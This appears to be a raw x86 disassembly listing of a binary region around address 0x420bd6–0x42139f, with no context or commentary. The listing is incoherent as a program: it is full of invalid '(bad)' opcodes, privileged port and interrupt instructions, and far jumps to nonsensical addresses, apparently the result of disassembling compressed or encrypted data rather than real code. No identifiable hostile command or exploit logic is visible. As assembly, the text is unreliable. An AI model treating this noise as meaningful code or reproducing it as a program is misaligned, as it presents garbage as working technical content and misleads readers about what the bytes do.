  420bd6:	fwait
  420bd7:	addr16 xchg edi,eax
  420bd9:	mov    edx,0x92c974de
  420bde:	mov    ds:0xb814edb6,eax
  420be3:	jnp    0x420c5b
  420be5:	lahf   
  420be6:	and    ch,al
  420be8:	push   edi
  420be9:	jb     0x420bef
  420beb:	mov    esp,0xe30986f4
  420bf0:	sbb    DWORD PTR [ebp+0x6],0x79
  420bf4:	in     eax,dx
  420bf5:	loopne 0x420b92
  420bf7:	hlt    
  420bf8:	popa   
  420bf9:	mov    ebx,0x105d85c5
  420bfe:	lea    esp,[esi]
  420c00:	js     0x420bd0
  420c02:	sbb    bl,BYTE PTR [ebx+0x26]
  420c05:	ret    
  420c06:	push   0x45
  420c08:	mov    bh,0x2e
  420c0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c0b:	mov    ds:0x9bfbf8b6,eax
  420c10:	mov    ah,0xb5
  420c12:	dec    eax
  420c13:	icebp  
  420c14:	sahf   
  420c15:	sbb    DWORD PTR [eax-0x3a8a25fb],eax
  420c1b:	scas   eax,DWORD PTR es:[edi]
  420c1c:	pushf  
  420c1d:	hlt    
  420c1e:	(bad)  
  420c20:	call   0x3db9:0x4273db2c
  420c27:	stc    
  420c28:	pop    es
  420c29:	gs clc 
  420c2b:	and    DWORD PTR ds:0xb66d602c,eax
  420c31:	rcr    BYTE PTR [edi-0x1446a202],cl
  420c37:	adc    esp,ebp
  420c39:	push   ecx
  420c3a:	addr16 aad 0xe
  420c3d:	xor    BYTE PTR [esi+0x298be33],0x6e
  420c44:	ds mov cx,0xeaab
  420c49:	dec    esi
  420c4a:	pop    eax
  420c4b:	pop    es
  420c4c:	sahf   
  420c4d:	sbb    BYTE PTR [ebx+0x4a756091],ch
  420c53:	or     ch,0xdf
  420c56:	lods   eax,DWORD PTR ds:[esi]
  420c57:	adc    DWORD PTR [ebp+0x58],0xb
  420c5b:	arpl   di,ax
  420c5d:	mov    ebx,0x5068c7a4
  420c62:	mov    dl,0xd8
  420c64:	and    al,0x11
  420c66:	inc    ebp
  420c67:	mov    esp,0xaa4c800a
  420c6c:	inc    esi
  420c6d:	loope  0x420c1f
  420c6f:	dec    edx
  420c70:	fiadd  DWORD PTR [edx-0x72523e6f]
  420c76:	fsubrp st(7),st
  420c78:	(bad)  
  420c7a:	mov    ds:0x4000870a,al
  420c7f:	sub    al,bh
  420c81:	(bad)  
  420c83:	mov    dl,0x73
  420c85:	lahf   
  420c86:	jecxz  0x420cb5
  420c88:	fmul   QWORD PTR [ecx-0xe]
  420c8b:	rol    dh,0x34
  420c8e:	in     al,0x7c
  420c90:	xchg   esi,eax
  420c91:	imul   esi,DWORD PTR [eax],0xe3a427b5
  420c97:	je     0x420ca2
  420c99:	retf   
  420c9a:	leave  
  420c9b:	mov    eax,0xd49c73c7
  420ca0:	lds    esi,FWORD PTR [esi]
  420ca2:	and    dl,BYTE PTR [ebp-0x55cbe4cb]
  420ca8:	add    BYTE PTR [esi-0x39],0xe6
  420cac:	test   BYTE PTR [esi],cl
  420cae:	test   DWORD PTR [ebx*4-0x39b7c655],edx
  420cb5:	addr16 mov bl,0xff
  420cb8:	pop    edx
  420cb9:	jp     0x420cf8
  420cbb:	jmp    0x7531:0x6c58f301
  420cc2:	in     eax,dx
  420cc3:	push   ss
  420cc4:	dec    edi
  420cc5:	int    0x13
  420cc7:	pop    es
  420cc8:	and    cl,0xb9
  420ccb:	xchg   edx,eax
  420ccc:	jb     0x420cce
  420cce:	ret    0xa077
  420cd1:	adc    DWORD PTR [esi+0x1],ecx
  420cd4:	(bad)  
  420cd5:	fmulp  st(1),st
  420cd7:	mov    ds:0xe25ee12,eax
  420cdc:	add    BYTE PTR ds:0xb9c37c22,bl
  420ce2:	dec    esi
  420ce3:	cmp    bl,dh
  420ce5:	aaa    
  420ce6:	push   cs
  420ce7:	or     al,0x25
  420ce9:	ret    
  420cea:	adc    BYTE PTR [eax+0x4d7c90f2],ch
  420cf0:	inc    ebp
  420cf1:	or     ebx,DWORD PTR [edx]
  420cf3:	ds dec ebp
  420cf5:	pop    edx
  420cf6:	popf   
  420cf7:	in     al,0x71
  420cf9:	shl    BYTE PTR [edx+0x64],1
  420cfc:	fwait
  420cfd:	aad    0x35
  420cff:	fcmovb st,st(3)
  420d01:	imul   ebp,DWORD PTR [eax+0x6d],0xffffffdd
  420d05:	pushf  
  420d06:	mov    DWORD PTR [esi],0xc6c330fa
  420d0c:	jl     0x420cf7
  420d0e:	jle    0x420d7f
  420d10:	or     ah,cl
  420d12:	mul    DWORD PTR [edi+0x550bb2b6]
  420d18:	mov    ebp,DWORD PTR [edi-0x7109fc2]
  420d1e:	out    0x39,al
  420d20:	inc    ebp
  420d21:	add    dl,BYTE PTR [edx-0x9fac018]
  420d27:	xor    bh,BYTE PTR [edi-0x5a150ae7]
  420d2d:	adc    bh,BYTE PTR [esi-0x1c52d3b1]
  420d33:	rcr    DWORD PTR [edx-0x60],1
  420d36:	call   0xe500ce68
  420d3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d3c:	mov    ecx,0x57abc2f2
  420d41:	sti    
  420d42:	dec    esi
  420d43:	pushf  
  420d44:	jg     0x420dba
  420d46:	mov    WORD PTR [eax+0x39],?
  420d49:	push   ecx
  420d4a:	loopne 0x420d4e
  420d4c:	jg     0x420d13
  420d4e:	mov    ds,WORD PTR [edi-0x76d19fa2]
  420d54:	leave  
  420d55:	jp     0x420d7e
  420d57:	xor    DWORD PTR [esp+eiz*4-0x46],esi
  420d5b:	push   esi
  420d5c:	clc    
  420d5d:	frstor [ebp-0x60]
  420d60:	das    
  420d61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d62:	sti    
  420d63:	sub    ecx,DWORD PTR [ebp+0x6b]
  420d66:	adc    edx,DWORD PTR [ecx]
  420d68:	mov    eax,ds:0x5efef1aa
  420d6d:	pop    ecx
  420d6e:	dec    esp
  420d6f:	inc    ecx
  420d70:	in     eax,dx
  420d71:	shl    DWORD PTR [edx+0x13],1
  420d74:	mov    dl,0xd9
  420d76:	aaa    
  420d77:	es pushf 
  420d79:	cli    
  420d7a:	hlt    
  420d7b:	fnsave [ecx]
  420d7d:	jnp    0x420d72
  420d7f:	push   ebx
  420d80:	inc    edi
  420d81:	sub    bl,bl
  420d83:	or     DWORD PTR [eax-0x1e694379],esp
  420d89:	aas    
  420d8a:	fs mov bh,0xd0
  420d8e:	aad    0xe9
  420d90:	inc    ebp
  420d91:	addr16 iret 
  420d93:	mov    ebp,0x8ee98258
  420d98:	(bad)  
  420d99:	cmp    BYTE PTR [ebp-0x4c5842b7],dh
  420d9f:	inc    ebx
  420da0:	inc    esp
  420da1:	cmp    BYTE PTR cs:[eax],al
  420da4:	mov    al,ds:0x46fdf214
  420da9:	jae    0x420dc0
  420dab:	fadd   QWORD PTR [bx-0xd]
  420daf:	mov    bh,0xab
  420db1:	and    DWORD PTR [edx+0x18],esp
  420db4:	pop    ds
  420db5:	pop    ecx
  420db6:	cwde   
  420db7:	popf   
  420db8:	sub    ecx,DWORD PTR [eax]
  420dba:	jmp    0x7486:0xf31f732e
  420dc1:	int3   
  420dc2:	add    eax,DWORD PTR [eax]
  420dc4:	into   
  420dc5:	ret    
  420dc6:	add    al,0xc5
  420dc8:	sbb    BYTE PTR [esi],ch
  420dca:	and    bh,ah
  420dcc:	jbe    0x420e0e
  420dce:	mov    cs,esi
  420dd0:	add    al,0xbb
  420dd2:	mov    ds:0x8117dc54,al
  420dd7:	inc    eax
  420dd8:	lods   al,BYTE PTR ds:[esi]
  420dd9:	(bad)  
  420dda:	daa    
  420ddb:	js     0x420de5
  420ddd:	popa   
  420dde:	popa   
  420ddf:	jg     0x420da4
  420de1:	dec    esi
  420de2:	das    
  420de3:	js     0x420da5
  420de5:	jb     0x420e21
  420de7:	sti    
  420de8:	pop    ds
  420de9:	lods   al,BYTE PTR ds:[esi]
  420dea:	mov    DWORD PTR [ebp-0xdb76d80],0x9894fb75
  420df4:	aas    
  420df5:	sub    eax,0x204eeb07
  420dfa:	xlat   BYTE PTR ds:[ebx]
  420dfb:	retf   
  420dfc:	sbb    al,0xf0
  420dfe:	aaa    
  420dff:	push   cs
  420e00:	or     DWORD PTR [edi-0x11],0x37
  420e04:	mov    al,0x2d
  420e06:	jmp    0x74a3af97
  420e0b:	push   ss
  420e0c:	and    cl,BYTE PTR [edi]
  420e0e:	mov    cl,0xff
  420e10:	daa    
  420e11:	sub    BYTE PTR [esi],0x45
  420e14:	jbe    0x420e29
  420e16:	cli    
  420e17:	in     eax,dx
  420e18:	push   ds
  420e19:	(bad)  
  420e1a:	cmp    ebp,ebx
  420e1c:	ins    BYTE PTR es:[edi],dx
  420e1d:	(bad)  
  420e1e:	jmp    0x1d89:0x612e5bbb
  420e25:	mov    bh,0x60
  420e27:	leave  
  420e28:	(bad)  
  420e2a:	add    dh,BYTE PTR [ebp-0x1c2dcada]
  420e30:	lea    esp,ds:0x16d38505
  420e36:	mov    esp,0x9f50c7a9
  420e3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e3c:	push   ecx
  420e3d:	inc    edx
  420e3e:	xor    cl,BYTE PTR [eax]
  420e40:	xor    BYTE PTR [ebp-0x13],ah
  420e43:	(bad)  
  420e45:	pop    ss
  420e46:	push   0xffffffdf
  420e48:	aad    0xb7
  420e4a:	cmp    eax,0xaebb19bc
  420e4f:	pop    ebp
  420e50:	mov    esi,DWORD PTR ss:[esp+edx*2+0x65]
  420e55:	in     al,0xe1
  420e57:	add    DWORD PTR [edi],0xffffff8a
  420e5a:	push   ebp
  420e5b:	push   0x1c34643a
  420e60:	fst    st(1)
  420e62:	js     0x420ed8
  420e64:	icebp  
  420e65:	(bad)  
  420e66:	jnp    0x420e8b
  420e68:	mov    dl,0x90
  420e6a:	push   edx
  420e6b:	ret    0xfef5
  420e6e:	mov    eax,0xe4df1a0d
  420e73:	push   esp
  420e74:	imul   ecx,DWORD PTR [edx],0x3f141926
  420e7a:	jnp    0x420e0b
  420e7c:	mov    ds:0xc0f0de8f,al
  420e81:	fldenv [ecx+0x5ed51065]
  420e87:	rcpps  xmm7,XMMWORD PTR [ebx-0x73]
  420e8b:	call   0xaec0f38e
  420e90:	fiadd  DWORD PTR [edx]
  420e92:	hlt    
  420e93:	cmp    dl,BYTE PTR [esi]
  420e95:	add    BYTE PTR [eax+0x39f2c0],0x48
  420e9c:	mov    dh,0xb6
  420e9e:	scas   eax,DWORD PTR es:[edi]
  420e9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ea0:	push   esp
  420ea1:	fnsave [edx]
  420ea3:	sub    eax,0xc8ce472d
  420ea8:	std    
  420ea9:	cmp    BYTE PTR [esi+eax*4],ch
  420eac:	mov    ebx,0x947d31e6
  420eb1:	outs   dx,DWORD PTR ds:[esi]
  420eb2:	call   0xf998:0x3565b48
  420eb9:	pop    edx
  420eba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ebb:	inc    edx
  420ebc:	push   eax
  420ebd:	mov    edx,0xb4d9aee7
  420ec2:	dec    edx
  420ec3:	xor    DWORD PTR [ebp+0x2af6b59d],eax
  420ec9:	cmp    bh,BYTE PTR [esi+0x7]
  420ecc:	int    0xbe
  420ece:	dec    ebx
  420ecf:	repnz add eax,0x7117e070
  420ed5:	gs and eax,0xbd2a3a37
  420edb:	push   eax
  420edc:	fwait
  420edd:	rcl    DWORD PTR ds:0x46ce46af,1
  420ee3:	mov    ds:0x9779a0d8,al
  420ee8:	sub    DWORD PTR [ebp+0x118dffde],eax
  420eee:	lea    eax,[ebx+eax*1]
  420ef1:	shl    DWORD PTR [eax],cl
  420ef3:	push   cs
  420ef4:	jge    0x420e86
  420ef6:	mov    bl,0x3b
  420ef8:	loope  0x420f0f
  420efa:	je     0x420ea1
  420efc:	rcr    BYTE PTR [ebx-0x29a4637],0xc4
  420f03:	and    al,0x71
  420f05:	lods   eax,DWORD PTR ds:[esi]
  420f06:	pop    esi
  420f07:	add    al,0x66
  420f09:	xor    ah,BYTE PTR [ebp-0x56]
  420f0c:	pop    ebp
  420f0d:	jae    0x420e90
  420f0f:	mov    ecx,0x24bb062f
  420f14:	aas    
  420f15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f16:	shl    DWORD PTR [eax-0x1b2a301d],cl
  420f1c:	mov    eax,ds:0xdc377475
  420f21:	in     al,0x78
  420f23:	dec    ecx
  420f24:	jo     0x420eac
  420f26:	add    edi,DWORD PTR [edx-0x7]
  420f29:	outs   dx,BYTE PTR ds:[esi]
  420f2a:	sub    DWORD PTR [ebp+0x3438ce9b],0x38
  420f31:	or     al,0xa2
  420f33:	scas   al,BYTE PTR es:[edi]
  420f34:	mov    ebp,es
  420f36:	mov    eax,0x33db9a7c
  420f3b:	aas    
  420f3c:	cmp    al,0x5f
  420f3e:	cmp    eax,0xc42ee59b
  420f43:	dec    eax
  420f44:	pcmpgtd mm7,mm0
  420f47:	loop   0x420f65
  420f49:	and    eax,0x28d45e41
  420f4e:	dec    ecx
  420f4f:	push   cs
  420f50:	pusha  
  420f51:	rcr    bl,1
  420f53:	xchg   esi,eax
  420f54:	ins    BYTE PTR es:[edi],dx
  420f55:	push   edx
  420f56:	and    cl,BYTE PTR [edx+ebx*1-0x70]
  420f5a:	cli    
  420f5b:	out    0x6e,al
  420f5d:	mov    ds:0x4dbbb51,eax
  420f62:	dec    esp
  420f63:	imul   ebp,DWORD PTR [ecx+0xba91d79],0xc81c798f
  420f6d:	cld    
  420f6e:	or     BYTE PTR [eax+0x12],0xa5
  420f72:	fstp   DWORD PTR [ebx+0x19]
  420f75:	push   edx
  420f76:	ins    DWORD PTR es:[edi],dx
  420f77:	or     BYTE PTR [ebx],0xad
  420f7a:	dec    esp
  420f7b:	retf   0xef9e
  420f7e:	sahf   
  420f7f:	mov    DWORD PTR [edi],ebp
  420f81:	cmp    DWORD PTR [ecx-0x4fa95a3a],ecx
  420f87:	xor    eax,0xe7cc35b
  420f8c:	mov    es,WORD PTR [esp+esi*8-0x7f]
  420f90:	push   esp
  420f91:	nop
  420f92:	sub    ecx,DWORD PTR [ebx-0x3]
  420f95:	aam    0x85
  420f97:	jno    0x420f2e
  420f99:	(bad)  
  420f9a:	jo     0x420f8b
  420f9c:	in     al,0x39
  420f9e:	aas    
  420f9f:	in     al,0xce
  420fa1:	pop    ss
  420fa2:	scas   al,BYTE PTR es:[edi]
  420fa3:	sub    al,0x79
  420fa5:	out    0xcb,al
  420fa7:	mov    esi,0x8ed42236
  420fac:	or     ebp,DWORD PTR [ebx-0x70]
  420faf:	lahf   
  420fb0:	push   esi
  420fb1:	(bad)  
  420fb3:	call   0x3cdcd24f
  420fb8:	lahf   
  420fb9:	lods   eax,DWORD PTR fs:[esi]
  420fbb:	inc    esi
  420fbc:	icebp  
  420fbd:	test   bh,dh
  420fbf:	jmp    0xd1c8:0x5fb2dc8c
  420fc6:	mov    ch,0x51
  420fc8:	jmp    0x421008
  420fca:	jg     0x420f98
  420fcc:	pop    ss
  420fcd:	sar    BYTE PTR [ebp-0x2d],cl
  420fd0:	jmp    0x1059:0x59358ef0
  420fd7:	or     eax,0x5bdf3aa1
  420fdc:	daa    
  420fdd:	jp     0x420ff5
  420fdf:	mul    edi
  420fe1:	mov    eax,ds:0x4af20639
  420fe6:	xchg   ebx,eax
  420fe7:	scas   eax,DWORD PTR es:[edi]
  420fe8:	ss inc esp
  420fea:	pop    ds
  420feb:	add    BYTE PTR [edi-0x532cd373],cl
  420ff1:	pop    ds
  420ff2:	sbb    eax,0xf15c7658
  420ff7:	je     0x421023
  420ff9:	and    DWORD PTR [edi+0x7a],eax
  420ffc:	rcl    DWORD PTR [edx*1+0x678226fb],1
  421003:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421004:	leave  
  421005:	mov    ah,0x1
  421007:	fsubr  st,st(2)
  421009:	leave  
  42100a:	pop    ss
  42100b:	icebp  
  42100c:	test   BYTE PTR gs:[eax],dl
  42100f:	nop
  421010:	jnp    0x421084
  421012:	inc    ebx
  421013:	add    al,0x28
  421015:	sbb    ah,al
  421017:	inc    edi
  421018:	in     eax,dx
  421019:	xchg   edx,eax
  42101a:	loopne 0x420fec
  42101c:	nop
  42101d:	scas   eax,DWORD PTR es:[edi]
  42101e:	ja     0x420fb7
  421020:	test   DWORD PTR [esp+edi*2],0xa047ae3c
  421027:	aas    
  421028:	mov    cs,ecx
  42102a:	dec    esi
  42102b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42102c:	popa   
  42102d:	or     DWORD PTR [edi],0x3f
  421030:	pop    es
  421031:	loope  0x420ff0
  421033:	iret   
  421034:	dec    esi
  421035:	icebp  
  421036:	dec    ebp
  421037:	lahf   
  421038:	push   edi
  421039:	shl    BYTE PTR [eax],0xcc
  42103c:	xor    ebp,esi
  42103e:	(bad)
  421041:	mov    WORD PTR [ecx+0x4e5a2b1f],ds
  421047:	leave  
  421048:	sub    ebx,esi
  42104a:	(bad)  
  42104c:	mov    eax,DWORD PTR [eax-0x3574f4b8]
  421052:	clc    
  421053:	sbb    al,dl
  421055:	jp     0x421037
  421057:	adc    ah,cl
  421059:	jb     0x420ff0
  42105b:	push   eax
  42105c:	sbb    dl,BYTE PTR [ecx+0x2a]
  42105f:	jge    0x420ffa
  421061:	jg     0x421007
  421063:	lds    esp,FWORD PTR [ebp-0x587e44e8]
  421069:	(bad)  
  42106a:	pushf  
  42106b:	jecxz  0x42105d
  42106d:	pop    ebp
  42106e:	add    BYTE PTR [ebx-0x67],dh
  421071:	les    ebp,FWORD PTR [edi+0x26383ef0]
  421077:	shl    BYTE PTR [ebx-0x10161410],cl
  42107d:	pop    esp
  42107e:	and    dl,BYTE PTR [ebx-0x77]
  421081:	cwde   
  421082:	mov    cl,0x6f
  421084:	push   edi
  421085:	(bad)  
  421087:	mov    ebx,0x83e299f4
  42108c:	sti    
  42108d:	bound  esi,QWORD PTR [ecx-0x44]
  421090:	(bad)  
  421091:	xchg   ebx,eax
  421092:	or     al,0x81
  421094:	scas   al,BYTE PTR es:[edi]
  421095:	mov    bh,0xa0
  421097:	jno    0x42103b
  421099:	push   ebx
  42109a:	mov    al,0xd
  42109c:	mov    ds:0x993d2f9c,al
  4210a1:	mov    DWORD PTR [edx+0x12ef99f8],esp
  4210a7:	add    dl,ch
  4210a9:	sar    BYTE PTR [ebx],0x92
  4210ac:	mov    esi,0xde4131f6
  4210b1:	pushf  
  4210b2:	out    dx,eax
  4210b3:	pop    ebp
  4210b4:	retf   0xb3d5
  4210b7:	jg     0x4210eb
  4210b9:	shl    DWORD PTR [esi-0x31],1
  4210bc:	mov    edx,0x1665081b
  4210c1:	je     0x4210df
  4210c3:	mov    esi,0x5c397e92
  4210c8:	pop    eax
  4210c9:	xor    bh,BYTE PTR [eax]
  4210cb:	sub    dl,BYTE PTR [edi]
  4210cd:	int    0x6
  4210cf:	jg     0x4210ec
  4210d1:	loopne 0x421152
  4210d3:	fld    QWORD PTR ds:0x354f9205
  4210d9:	test   al,0xbf
  4210db:	iret   
  4210dc:	sbb    eax,0x6ab155d0
  4210e1:	mov    bl,0x44
  4210e3:	inc    esp
  4210e4:	mul    DWORD PTR [ebx-0x15a357b1]
  4210ea:	jle    0x421165
  4210ec:	inc    esp
  4210ed:	dec    ebx
  4210ee:	xlat   BYTE PTR ds:[ebx]
  4210ef:	clc    
  4210f0:	mov    dl,0x18
  4210f2:	mov    esp,0x82428702
  4210f7:	loopne 0x421096
  4210f9:	scas   al,BYTE PTR es:[edi]
  4210fa:	dec    eax
  4210fb:	cli    
  4210fc:	inc    edi
  4210fd:	cmp    bh,BYTE PTR [ecx+0x472180e7]
  421103:	sbb    eax,0xee3a50b
  421108:	inc    eax
  421109:	push   0x4d
  42110b:	lea    eax,[esp+ebp*2+0xe]
  42110f:	mov    cl,0xf3
  421111:	fadd   QWORD PTR [esi+edi*4+0x20]
  421115:	addr16 mov al,0xd4
  421118:	mov    ch,0xa6
  42111a:	and    al,0xfd
  42111c:	mov    ch,0xf9
  42111e:	pop    ss
  42111f:	inc    BYTE PTR [esi+esi*8-0x700c5c83]
  421126:	push   ebx
  421127:	sar    DWORD PTR [ecx-0x480d66af],1
  42112d:	mov    eax,0x10980294
  421132:	aam    0x5a
  421134:	aad    0x24
  421136:	xor    cl,BYTE PTR [ebx+0x1b]
  421139:	xlat   BYTE PTR ds:[ebx]
  42113a:	adc    eax,0xae877805
  42113f:	pusha  
  421140:	lds    eax,FWORD PTR [ebx]
  421142:	iret   
  421143:	out    0x28,al
  421145:	(bad)  
  421146:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421147:	stos   BYTE PTR es:[edi],al
  421148:	sbb    edx,DWORD PTR [ebx-0x7a]
  42114b:	ror    BYTE PTR ds:0x2ebd2849,0xa9
  421152:	dec    ecx
  421153:	imul   ebp,DWORD PTR [ebp+0xb],0x20970e9b
  42115a:	pusha  
  42115b:	int    0x6a
  42115d:	adc    eax,0x53add153
  421162:	xchg   ebx,eax
  421163:	int3   
  421164:	sbb    al,0x93
  421166:	mov    DWORD PTR [edx],eax
  421168:	pop    ss
  421169:	jle    0x421104
  42116b:	fadd   st(4),st
  42116d:	push   edx
  42116e:	stos   BYTE PTR es:[edi],al
  42116f:	push   ecx
  421170:	sub    BYTE PTR [edx-0x41f407c6],bh
  421176:	cmc    
  421177:	jl     0x42113d
  421179:	rcl    DWORD PTR [ecx+0x62],0x48
  42117d:	clc    
  42117e:	pop    ecx
  42117f:	adc    BYTE PTR [ebx-0x3c],ch
  421182:	sti    
  421183:	arpl   sp,bp
  421185:	jp     0x4211de
  421187:	add    BYTE PTR [esi-0x5458b45],ch
  42118d:	pusha  
  42118e:	mov    edi,0xda42827f
  421193:	dec    eax
  421194:	mov    ebx,0x9a118eb4
  421199:	mov    bl,0x57
  42119b:	push   ebp
  42119c:	sub    edx,DWORD PTR [edx+0x262ec20c]
  4211a2:	cmp    DWORD PTR [ebx],0xba5cfb5c
  4211a8:	lods   eax,DWORD PTR ds:[esi]
  4211a9:	sti    
  4211aa:	sub    al,0xac
  4211ac:	sbb    DWORD PTR [eax+0x5b755fde],edi
  4211b2:	sbb    ebx,DWORD PTR [ecx-0x31]
  4211b5:	xor    dh,al
  4211b7:	push   ds
  4211b8:	int    0xa1
  4211ba:	adc    al,0xb1
  4211bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4211bd:	fwait
  4211be:	sub    eax,0x83366eae
  4211c3:	xchg   DWORD PTR [edx],edx
  4211c5:	aad    0x7e
  4211c7:	add    al,0x23
  4211c9:	cmp    dh,dl
  4211cb:	sar    bh,cl
  4211cd:	xchg   DWORD PTR [ebx],esp
  4211cf:	inc    edx
  4211d0:	int    0xa9
  4211d2:	in     eax,dx
  4211d3:	sbb    esi,DWORD PTR [edx+ebx*1+0x578a6358]
  4211da:	cwde   
  4211db:	ds (bad) 
  4211dd:	out    dx,eax
  4211de:	push   eax
  4211df:	xchg   esi,eax
  4211e0:	dec    ebx
  4211e1:	jecxz  0x42123c
  4211e3:	repnz (bad) 
  4211e5:	out    dx,al
  4211e6:	sti    
  4211e7:	mov    ebp,ebx
  4211e9:	xchg   BYTE PTR [eax+0x4161d611],bh
  4211ef:	mov    al,0x37
  4211f1:	into   
  4211f2:	xor    esp,DWORD PTR [eax]
  4211f4:	xor    bh,ch
  4211f6:	inc    eax
  4211f7:	adc    eax,0x862d2772
  4211fc:	in     al,dx
  4211fd:	fcmove st,st(0)
  4211ff:	test   eax,0xc0a43056
  421204:	and    eax,0x4ecba334
  421209:	jle    0x421230
  42120b:	add    ecx,0x5e
  42120e:	add    eax,0x385bf9f2
  421213:	sbb    cl,BYTE PTR [edx-0x18af68c]
  421219:	int    0xcb
  42121b:	sti    
  42121c:	sbb    esi,esi
  42121e:	fs inc ebp
  421220:	pop    esp
  421221:	hlt    
  421222:	add    al,0x87
  421224:	xor    al,0xac
  421226:	push   0x3c
  421228:	push   ebx
  421229:	lods   al,BYTE PTR ds:[esi]
  42122a:	inc    ebx
  42122b:	icebp  
  42122c:	jnp    0x421251
  42122e:	cli    
  42122f:	in     eax,dx
  421230:	fistp  QWORD PTR [edx-0x2f]
  421233:	ret    0xa004
  421236:	jl     0x4211da
  421238:	pop    eax
  421239:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42123a:	test   BYTE PTR [edi+0x78],al
  42123d:	push   0xffffffd5
  42123f:	inc    ebx
  421240:	mov    al,ds:0x44eb0d98
  421245:	pushf  
  421246:	imul   esp,ebp,0x7d1e08ee
  42124c:	je     0x42121c
  42124e:	xchg   BYTE PTR [eax+0x5aca2428],al
  421254:	pop    esp
  421255:	mov    WORD PTR [edi],ds
  421257:	cmp    BYTE PTR [ebx],dl
  421259:	or     eax,0x33425e5f
  42125e:	call   0x2882a93
  421263:	cs inc ebp
  421265:	dec    ecx
  421266:	ds mov ah,0xf7
  421269:	pop    eax
  42126a:	xchg   BYTE PTR [esi],dh
  42126c:	jg     0x421251
  42126e:	in     al,dx
  42126f:	(bad)  
  421270:	fsubr  st(5),st
  421272:	out    0x54,eax
  421274:	lods   al,BYTE PTR ds:[esi]
  421275:	imul   edx,DWORD PTR [eax+0x30],0x2593ab88
  42127c:	mov    esp,0xbe44fef7
  421281:	pop    ds
  421282:	retf   0xff9b
  421285:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421286:	add    eax,ecx
  421288:	push   ebp
  421289:	fs sbb al,0xe
  42128c:	shl    dl,cl
  42128e:	call   DWORD PTR [ebp+ebx*1+0x7e]
  421292:	add    al,0x95
  421294:	aas    
  421295:	xchg   ebp,eax
  421296:	ret    0x8a69
  421299:	xor    al,bh
  42129b:	sbb    eax,0xba2166ec
  4212a0:	adc    DWORD PTR [edi-0x41],ebp
  4212a3:	lahf   
  4212a4:	xchg   ebp,eax
  4212a5:	or     ah,al
  4212a7:	enter  0xe428,0x34
  4212ab:	enter  0x7b4c,0x6c
  4212af:	cli    
  4212b0:	or     al,0x1e
  4212b2:	sub    eax,0x7b597db4
  4212b7:	repz imul ebp,DWORD PTR [esi-0x37],0x6eafc522
  4212bf:	stc    
  4212c0:	or     al,0x3b
  4212c2:	mov    esi,0x448a01f1
  4212c7:	retf   
  4212c8:	out    dx,al
  4212c9:	pusha  
  4212ca:	and    bh,BYTE PTR [esp+esi*8]
  4212cd:	mov    ss,esp
  4212cf:	or     ah,0xde
  4212d2:	call   0x4975:0xe6dd435b
  4212d9:	xor    DWORD PTR [edx],ebx
  4212db:	nop
  4212dc:	sahf   
  4212dd:	call   0x2bee83f1
  4212e2:	push   edx
  4212e3:	scas   eax,DWORD PTR es:[edi]
  4212e4:	pusha  
  4212e5:	and    DWORD PTR ds:0x70cf5de0,edx
  4212eb:	out    dx,al
  4212ec:	add    DWORD PTR [esi+0x46473de9],edx
  4212f2:	push   esp
  4212f3:	jns    0x42136d
  4212f5:	neg    DWORD PTR [edx+0x5c]
  4212f8:	mov    esp,DWORD PTR [edx]
  4212fa:	pop    edi
  4212fb:	lahf   
  4212fc:	ins    DWORD PTR es:[edi],dx
  4212fd:	pop    edi
  4212fe:	cmp    BYTE PTR [ebp+0x38],0xd0
  421302:	xchg   ebx,eax
  421303:	enter  0xd8ae,0xb8
  421307:	mul    esi
  421309:	cwde   
  42130a:	pop    eax
  42130b:	mov    eax,ds:0xfd399fe7
  421310:	outs   dx,BYTE PTR ds:[esi]
  421311:	jnp    0x4212f4
  421313:	cmc    
  421314:	fwait
  421315:	in     eax,0x26
  421317:	xor    esi,esi
  421319:	dec    BYTE PTR [ebx+0x4d]
  42131c:	xchg   ebp,eax
  42131d:	cdq    
  42131e:	xor    eax,0xc8475163
  421323:	or     ebp,edx
  421325:	mov    ebx,DWORD PTR ds:0x4064f488
  42132b:	sbb    DWORD PTR [esi],eax
  42132d:	in     al,0x2e
  42132f:	add    eax,DWORD PTR [eax-0x1ddeedd8]
  421335:	dec    ecx
  421336:	pop    ebp
  421337:	hlt    
  421338:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421339:	jl     0x4212da
  42133b:	push   ebp
  42133c:	or     ebx,DWORD PTR [edi-0x2e6242cb]
  421342:	inc    ebx
  421343:	call   0x2dae1b0b
  421348:	pushf  
  421349:	and    eax,0x565118e4
  42134e:	or     ecx,DWORD PTR [esi+edx*4-0xc]
  421352:	into   
  421353:	in     eax,dx
  421354:	pop    esp
  421355:	fisubr WORD PTR [eax-0x13]
  421358:	xor    ebp,edx
  42135a:	pop    esp
  42135b:	repnz fistp DWORD PTR [ebp+0x7b]
  42135f:	sbb    ebx,DWORD PTR [ecx-0x38f9b591]
  421365:	dec    ebx
  421366:	adc    eax,0x4454e4df
  42136b:	lock jecxz 0x421313
  42136e:	push   ss
  42136f:	(bad)  
  421370:	jecxz  0x4213ae
  421372:	lock in al,dx
  421374:	lea    eax,[esi]
  421376:	dec    edx
  421377:	xlat   BYTE PTR ds:[ebx]
  421379:	and    bh,BYTE PTR [esi-0x6c2616b9]
  42137f:	pop    edi
  421380:	dec    ebp
  421381:	jne    0x421366
  421383:	inc    edx
  421384:	xchg   edx,eax
  421385:	mov    edx,0xde7168f2
  42138a:	sbb    edx,ecx
  42138c:	(bad)  
  42138d:	pop    edi
  42138e:	lock (bad) 
  421390:	cdq    
  421391:	dec    eax
  421392:	fs sar bl,1
  421395:	ret    
  421396:	repnz mov bl,0x83
  421399:	outs   dx,BYTE PTR ds:[esi]
  42139a:	fiadd  DWORD PTR [eax]
  42139c:	pop    esp
  42139d:	hlt    
  42139e:	push   edi
  42139f:	xchg   ebp,eax
